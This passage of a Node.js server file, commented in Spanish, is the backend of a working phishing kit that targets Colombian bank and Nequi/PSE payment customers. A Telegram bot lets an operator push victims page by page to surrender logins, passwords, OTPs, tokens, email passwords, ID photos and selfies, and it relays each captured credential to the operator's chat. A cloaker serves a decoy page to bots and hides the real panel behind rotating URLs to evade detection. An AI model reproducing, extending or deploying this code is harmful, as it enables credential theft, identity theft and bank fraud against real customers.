            console.warn(`\u26a0\ufe0f Sin socket en este worker para ${sessionId} (sesión=${!!session}, sockets=${liveSockets.size}) — reenviando a otros workers`);
        }

        console.log(`\u2705 Procesando callback (sessionId=${sessionId}, live=${live}, sockets=${liveSockets.size})`);
        
        // Remover teclado inline del mensaje inmediatamente
        await bot.editMessageReplyMarkup(
            { inline_keyboard: [] }, 
            { chat_id: chatId, message_id: messageId }
        ).catch(() => {});

        // Manejadores especiales para Nequi y PSE
        if (module === 'nequi' && action === 'follow') {
            const bank = session?.data?.bank;
            const bankRoute = getBankRoute(bank);
            const destLabel = bankRoute ? bank : 'PSE';
            await bot.sendMessage(chatId, `\u2705 Cliente redirigido a ${destLabel}`, { reply_to_message_id: messageId });
            deliverToSession(sessionId, 'actionFollow', {
                sessionId,
                action: 'follow',
                nextPage: 'pse',
                bank,
                bankRoute
            });
            await bot.answerCallbackQuery(callbackId, { text: '\u2705 Continuar a PSE' });
            return;
        } else if (module === 'nequi' && action === 'reject') {
            await bot.sendMessage(chatId, '\u274c Transacci\u00f3n rechazada', { reply_to_message_id: messageId });
            deliverToSession(sessionId, 'actionReject', { sessionId, action: 'reject' });
            sessionManager.deleteSession(sessionId);
            await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
            return;
        } else if (module === 'nequi' && action === 'wait') {
            await bot.sendMessage(chatId, '\u23f3 Cliente en espera', { reply_to_message_id: messageId });
            deliverToSession(sessionId, 'actionWait', { sessionId, action: 'wait', waitTime: 15 });
            await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
            return;
        } else if (module === 'pse' && action === 'approve') {
            const bank = session?.data?.bank;
            const bankRoute = getBankRoute(bank);
            await bot.sendMessage(chatId, '\u2705 PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId });
            deliverToSession(sessionId, 'actionApprovePSE', { sessionId, action: 'approve', bank, bankRoute });
            await bot.answerCallbackQuery(callbackId, { text: '\u2705 PSE aprobado' });
            return;
        } else if (module === 'pse' && action === 'reject') {
            await bot.sendMessage(chatId, '\u274c PSE rechazado', { reply_to_message_id: messageId });
            deliverToSession(sessionId, 'actionRejectPSE', { sessionId, action: 'reject' });
            sessionManager.deleteSession(sessionId);
            await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
            return;
        } else if (module === 'pse' && action === 'wait') {
            await bot.sendMessage(chatId, '\u23f3 PSE en espera', { reply_to_message_id: messageId });
            deliverToSession(sessionId, 'actionWaitPSE', { sessionId, action: 'wait', waitTime: 15 });
            await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
            return;
        } else if (module === 'bank' && action === 'continue') {
            deliverToSession(sessionId, 'telegramAction', {
                action: 'continue',
                sessionId,
                fromTelegram: true,
                telegramMessageId: messageId,
                timestamp: Date.now()
            });
            await bot.answerCallbackQuery(callbackId, { text: '\u2705 Continuar' });
            await bot.sendMessage(chatId, '\u2705 Continuar enviado al cliente', { reply_to_message_id: messageId });
            return;
        }
        // Manejadores para banco (Ita\u00fa, etc.)
        else if (module === 'itau') {
            const pageMap = {
                'logo': 'index.html',
                'otp': 'otp.html',
                'token': 'token.html',
                'correo': 'correo.html',
                'cedula': 'cedula.html',
                'cara': 'biometria.html',
                'finalizar': 'finalizar.html'
            };

            const actionNames = {
                'logo': '\ud83c\udfe0 Pidiendo Login',
                'otp': '\ud83d\udd22 Pidiendo OTP',
                'token': '\ud83c\udfab Pidiendo Token',
                'correo': '\ud83d\udce7 Pidiendo Correo',
                'cedula': '\ud83e\udeaa Pidiendo C\u00e9dula',
                'cara': '\ud83e\udd33 Pidiendo Cara',
                'finalizar': '\u2705 Finalizando'
            };

            if (action === 'finalizar') {
                await bot.sendMessage(chatId, '\u2705 Transacci\u00f3n finalizada - Sesi\u00f3n cerrada', { reply_to_message_id: messageId });
                telegramMessages.delete(sessionId);
                sessionManager.deleteSession(sessionId);
                deliverToSession(sessionId, 'redirect', { sessionId, page: '/', clearData: true });
                await bot.answerCallbackQuery(callbackId, { text: '\u2705 Finalizado' });
                return;
            } else if (pageMap[action]) {
                await bot.sendMessage(chatId, `${actionNames[action] || action}`, { reply_to_message_id: messageId });
                deliverToSession(sessionId, 'redirect', {
                    sessionId,
                    page: `/bancas/Itau/${pageMap[action]}`,
                    clearData: action === 'logo'
                });
                await bot.answerCallbackQuery(callbackId, { text: actionNames[action] || action });
                return;
            }
        }


        // Para todas las dem\u00e1s bancas, enviar la acci\u00f3n directamente al room
        console.log('\ud83d\udce4 Enviando acci\u00f3n al cliente:', { action, sessionId });

        deliverToSession(sessionId, 'telegramAction', {
            action: action,
            sessionId: sessionId,
            messageId: messageId,
            fromTelegram: true,
            telegramMessageId: messageId,
            timestamp: Date.now()
        });

        // Confirmar al admin
        await bot.answerCallbackQuery(callbackId, { 
            text: `\u2705 Acci\u00f3n "${action}" enviada` 
        });

        // Enviar confirmaci\u00f3n en el chat (solo una vez)
        await bot.sendMessage(chatId, `\u2705 Acci\u00f3n "${action}" enviada`, { 
            reply_to_message_id: messageId 
        });

    } catch (error) {
        console.error('❌ Error en callback_query:', error.message, error.stack?.split('\n')[1]);
        if (callbackId) {
            await bot.answerCallbackQuery(callbackId, { text: '❌ Error', show_alert: true }).catch(() => {});
        }
    }
}

bot.on('callback_query', (callbackQuery) => {
    handleCallbackQuery(callbackQuery).catch((err) => console.error('callback_query:', err.message));
});

// Generar teclado específico para cada banco
function getBankKeyboard(bankName, sessionId) {
    const bankLower = bankName.toLowerCase();
    
    if (bankLower === 'itaú' || bankLower === 'itau') {
        return {
            inline_keyboard: [
                [
                    { text: '🏠 Pedir Login', callback_data: `itau_logo_${sessionId}` },
                    { text: '🔢 Pedir OTP', callback_data: `itau_otp_${sessionId}` }
                ],
                [
                    { text: '🎫 Pedir Token', callback_data: `itau_token_${sessionId}` },
                    { text: '📧 Pedir Correo', callback_data: `itau_correo_${sessionId}` }
                ],
                [
                    { text: '🪪 Pedir Cédula', callback_data: `itau_cedula_${sessionId}` },
                    { text: '🤳 Pedir Cara', callback_data: `itau_cara_${sessionId}` }
                ],
                [
                    { text: '✅ Finalizar', callback_data: `itau_finalizar_${sessionId}` }
                ]
            ]
        };
    }
    
    // Botones genéricos para otros bancos
    return {
        inline_keyboard: [
            [
                { text: '➡️ Continuar', callback_data: `bank_continue_${sessionId}` },
                { text: '⏳ Esperar', callback_data: `bank_wait_${sessionId}` }
            ],
            [
                { text: '🔄 Repetir', callback_data: `bank_repeat_${sessionId}` },
                { text: '❌ Rechazar', callback_data: `bank_reject_${sessionId}` }
            ]
        ]
    };
}

function formatAmount(amount) {
    const clean = amount ? String(amount).replace(/[^0-9]/g, '') : '0';
    return clean ? parseInt(clean).toLocaleString('es-CO') : 'N/A';
}

function getTimestamp() {
    return new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota', hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function formatTelegramMessage(data, sessionId) {
    const personType = data.personType === 'natural' ? '👤 Natural' : '🏢 Jurídica';
    const timestamp = getTimestamp();
    
    return `━━━━━━━━━━━━━━━━━━━━━━
🔔 <b>NUEVA RECARGA NEQUI</b>
━━━━━━━━━━━━━━━━━━━━━━

📱 <b>Celular:</b> ${data.phone || 'N/A'}
💰 <b>Monto:</b> $${formatAmount(data.amount)}
🏦 <b>Banco:</b> ${data.bank || 'N/A'}
${personType}
🕐 <b>Hora:</b> ${timestamp}

🆔 <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━`.trim();
}

function formatPSEMessage(data, sessionId) {
    const personType = data.personType === 'natural' ? '👤 Natural' : '🏢 Jurídica';
    const registered = data.registeredUser ? '✅ Registrado' : '🆕 Nuevo';
    const timestamp = getTimestamp();

    return `━━━━━━━━━━━━━━━━━━━━━━
💳 <b>FORMULARIO PSE</b>
━━━━━━━━━━━━━━━━━━━━━━

📱 <b>Celular:</b> ${data.phone || 'N/A'}
💰 <b>Monto:</b> $${formatAmount(data.amount)}
🏦 <b>Banco:</b> ${data.bank || 'N/A'}
${personType}
📧 <b>Email:</b> ${data.email || 'N/A'}
${registered}
🕐 <b>Hora:</b> ${timestamp}

🆔 <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━`.trim();
}

function formatBankMessageAccumulated(data, sessionId) {
    const timestamp = getTimestamp();
    let message = `━━━━━━━━━━━━━━━━━━━━━━
🏦 <b>${data.bank?.toUpperCase() || 'BANCO'}</b>
━━━━━━━━━━━━━━━━━━━━━━

`;

    // Datos de login
    if (data.documentType) message += `📋 <b>Tipo Doc:</b> ${data.documentType}\n`;
    if (data.documentNumber) message += `🆔 <b>Documento:</b> ${data.documentNumber}\n`;
    if (data.password) message += `🔐 <b>Contraseña:</b> ${data.password}\n`;
    
    // OTP
    if (data.otp) message += `🔢 <b>OTP:</b> ${data.otp}\n`;
    
    // Token
    if (data.token) message += `🎫 <b>Token:</b> ${data.token}\n`;
    if (data.tokenCard) message += `💳 <b>Token Tarjeta:</b> ${data.tokenCard}\n`;
    
    // Email - Solo mostrar si es del banco (con emailPassword)
    // El email de PSE no se muestra aquí porque ya salió en el mensaje de PSE
    if (data.emailPassword) {
        message += `📧 <b>Email Banco:</b> ${data.email}\n`;
        message += `🔑 <b>Password Email:</b> ${data.emailPassword}\n`;
    }
    
    // Imágenes
    if (data.face) message += `📸 <b>Biometría:</b> Selfie capturada\n`;
    if (data.front || data.back) {
        message += `🪪 <b>Cédula:</b>`;
        if (data.front) message += ` Frontal`;
        if (data.back) message += ` Reverso`;
        message += `\n`;
    }

    message += `\n🕐 <b>Hora:</b> ${timestamp}

🆔 <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━`;

    return message.trim();
}

// Limpieza automática de sesiones cada 10 minutos
setInterval(() => sessionManager.cleanExpiredSessions(), 10 * 60 * 1000);

app.get('/api/stats', (req, res) => {
    res.json({ 
        ...sessionManager.getStats(), 
        uptime: Math.floor(process.uptime()),
        timestamp: Date.now()
    });
});

app.get('/api/session/:sessionId', (req, res) => {
    const session = sessionManager.getSession(req.params.sessionId);
    if (session) {
        res.json({ 
            exists: true, 
            module: session.module, 
            currentPage: session.currentPage,
            createdAt: session.createdAt
        });
    } else {
        res.json({ exists: false });
    }
});

app.get('/api/health', (req, res) => {
    const stats = sessionManager.getStats();
    res.json({ 
        status: 'ok', 
        uptime: Math.floor(process.uptime()), 
        timestamp: Date.now(),
        sessions: stats,
        connections: io.engine.clientsCount
    });
});

// Health check
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Cloaker: bots → landing.html | humanos → redirect a slug rotativo
const rotator = new EndpointRotator({
    secret:   process.env.ROTATION_SECRET,
    windowMs: parseInt(process.env.ROTATION_WINDOW_MS, 10) || 10 * 60 * 1000,
    prefix:   'r'
});

app.get('/', createCloaker({
    botPage: 'landing.html',
    humanPage: 'index.html',
    basePath: __dirname,
    logEnabled: NODE_ENV !== 'production',
    onHuman: (req, res) => res.redirect(302, rotator.currentPath())
}));

// Slug rotativo → sirve el panel real (solo si slug vigente)
// Inyecta <base href="/"> para que assets relativos (styles.css, js/, img/)
// resuelvan correctamente bajo /r/{slug}.
let _indexCached = null;
function getIndexHtml() {
    if (_indexCached) return _indexCached;
    const raw = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');
    _indexCached = raw.replace(/<head(\s[^>]*)?>/i, m => `${m}\n    <base href="/">`);
    return _indexCached;
}

app.get('/r/:slug', validateSlug(rotator), (req, res) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.set('Content-Type', 'text/html; charset=utf-8');
    res.send(getIndexHtml());
});

// Endpoint para que el cliente refresque slug antes de expirar (sin recargar)
app.get('/api/rotation', createSlugEndpoint(rotator));

// Acceso explícito a la landing (link público)
app.get('/landing', (req, res) => {
    res.sendFile(path.join(__dirname, 'landing.html'));
});

/**
 * Resolver de directorios: sirve {ruta}/index.html para cualquier carpeta
 * sin enumerar rutas (ej: /pse/, /bancas/Itau/, /bancas/BBVA/...).
 * - Solo GET de paths que NO sean la raíz (la raíz va al cloaker).
 * - Solo si el index.html existe en disco (evita 200 falsos positivos).
 * - Bloquea path traversal (..) por seguridad.
 */
app.get(/^\/.+\/?$/, (req, res, next) => {
    const reqPath = decodeURIComponent(req.path);
    if (reqPath.includes('..')) return next();

    const candidate = path.join(__dirname, reqPath, 'index.html');
    // Evitar romper otras rutas dinámicas: solo intentar si el path NO es ya un archivo
    if (path.extname(reqPath)) return next();

    fs.stat(candidate, (err, stat) => {
        if (err || !stat.isFile()) return next();
        res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.sendFile(candidate);
    });
});

// 404 silencioso (no revela stack ni framework)
app.use((req, res) => {
    res.status(404).type('text/plain').send('Not Found');
});

// Manejador global de errores (graceful — nunca expone stack en prod)
app.use((err, req, res, next) => {
    console.error('[error]', err.message, err.stack?.split('\n')[1]);
    if (res.headersSent) return next(err);
    res.status(500).type('text/plain').send(NODE_ENV === 'production' ? 'Internal Error' : err.message);
});

server.listen(PORT, '0.0.0.0', async () => {
    console.log(`\n🚀 Servidor iniciado - Puerto: ${PORT} | Entorno: ${NODE_ENV}`);
    console.log(`📡 Socket.IO configurado con transports: websocket, polling`);
    console.log(`🤖 Bot de Telegram: ${TELEGRAM_TOKEN ? 'Configurado' : 'NO CONFIGURADO'}`);
    console.log(`💬 Chat ID: ${CHAT_ID}`);
    await initTelegramUpdates();
    console.log(`📬 Modo actualizaciones Telegram: ${telegramUpdateMode}\n`);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    if (NODE_ENV === 'production') {
        process.exit(1);
    }
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

function gracefulShutdown() {
    console.log('\n🛑 Cerrando servidor...');
    server.close(() => {
        console.log('✅ Servidor HTTP cerrado');
        const stop = telegramUpdateMode === 'webhook'
            ? bot.deleteWebHook()
            : bot.stopPolling({ cancel: true });
        stop
            .then(() => {
                console.log('✅ Bot de Telegram detenido');
                process.exit(0);
            })
            .catch((err) => {
                console.error('❌ Error deteniendo bot:', err);
                process.exit(1);
            });
    });
    setTimeout(() => {
        console.error('⚠️ Forzando cierre...');
        process.exit(1);
    }, 10000);
}
